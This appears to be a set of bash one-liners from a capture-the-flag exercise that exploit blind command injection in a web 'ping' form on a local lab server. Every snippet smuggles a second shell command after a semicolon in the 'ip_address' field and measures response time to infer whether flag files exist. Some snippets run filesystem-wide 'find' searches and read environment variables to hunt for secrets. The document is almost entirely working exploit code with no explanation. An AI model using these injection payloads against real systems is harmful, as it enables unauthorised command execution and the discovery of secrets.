t(){ curl -s -o /dev/null -X POST http://127.0.0.1:32826/ping --data-urlencode "ip_address=127.0.0.1; $1"; }
probe(){ s=$(date +%s%N); t "$1"; e=$(date +%s%N); echo "$(( (e-s)/1000000 ))ms :: $1"; }
for f in /app/flag /app/flag.txt /app/flag.py /app/app.py /app/main.py /app/requirements.txt /app/static /app/templates /app/FLAG /app/.flag; do probe "if [ -e $f ]; then sleep 2; fi"; done

t(){ curl -s -o /dev/null -X POST http://127.0.0.1:32826/ping --data-urlencode "ip_address=127.0.0.1; $1"; }
probe(){ s=$(date +%s%N); t "$1"; e=$(date +%s%N); echo "$(( (e-s)/1000000 ))ms :: $1"; }
for f in /flag /flag.txt /root/flag /root/flag.txt /tmp/flag /tmp/flag.txt /home/flag /home/flag.txt /opt/flag /opt/flag.txt /app/data/flag /app/data/flag.txt /var/flag /var/flag.txt /srv/flag /usr/src/app/flag /usr/src/app/app.py /flag/flag /secret/flag; do probe "if [ -e $f ]; then sleep 2; fi"; done

t(){ curl -s -o /dev/null -X POST http://127.0.0.1:32826/ping --data-urlencode "ip_address=127.0.0.1; $1"; }
probe(){ s=$(date +%s%N); t "$1"; e=$(date +%s%N); echo "$(( (e-s)/1000000 ))ms :: $1"; }
probe 'if [ -n "$(find / -iname "*flag*" 2>/dev/null)" ]; then sleep 2; fi'
probe 'if [ -n "$(find / -iname "*flag*" 2>/dev/null | head -1)" ]; then sleep 2; fi'
probe 'if [ -n "$(printenv | grep -i flag)" ]; then sleep 2; fi'
probe 'if [ -n "$FLAG" ]; then sleep 2; fi'

p(){ local s e; s=$(date +%s%N); curl -s -o /dev/null -X POST http://127.0.0.1:32826/ping --data-urlencode "ip_address=$1"; e=$(date +%s%N); local ms=$(( (e-s)/1000000 )); [ $ms -ge 2000 ] && echo "TRUE  $2" || echo "false $2"; }
p "127.0.0.1; [ \"\$(find / -iname '*flag*' 2>/dev/null | head -1 | cut -c1)\" = \"/\" ] && sleep 2" 'single quote find'
p "127.0.0.1; [ \"\$(find / -iname \"*flag*\" 2>/dev/null | head -1 | cut -c1)\" = \"/\" ] && sleep 2" 'double quote find'

p(){ local s e; s=$(date +%s%N); curl -s -o /dev/null --max-time 11 -X POST http://127.0.0.1:32826/ping --data-urlencode "ip_address=127.0.0.1; $1"; e=$(date +%s%N); local ms=$(( (e-s)/1000000 )); [ $ms -ge 1900 ] && echo "TRUE  $2" || echo "false $2"; }
for f in /FLAG /FLAG.txt /FLAG.md /FLAG.json /FLAG.flag /FLAG.asc /FLAG.log /FLAG.dat /FLAG.csv; do p "[ -f $f ] && sleep 2" "$f"; done
p 'ls / | grep -q FLAG && sleep 2' 'root has FLAG'
